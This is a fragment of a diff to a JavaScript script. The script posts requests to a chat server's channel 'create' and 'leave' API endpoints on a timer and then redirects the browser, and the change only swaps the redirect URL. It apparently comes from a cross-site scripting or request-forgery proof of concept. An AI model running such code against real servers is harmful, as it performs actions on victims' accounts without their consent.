@@ -23,7 +23,7 @@ setTimeout(function(){
 	$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/create', JSON.stringify(data), function(retData,status){		
 		setTimeout(function(){
 			$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/leave', function(data, status){
-				location.href = "http://leekspin.com";
+				location.href = "http://www.securityweek.com/vmware-products-affected-critical-glibc-flaw";
 				return 0;
 			});
 		}, 1000);
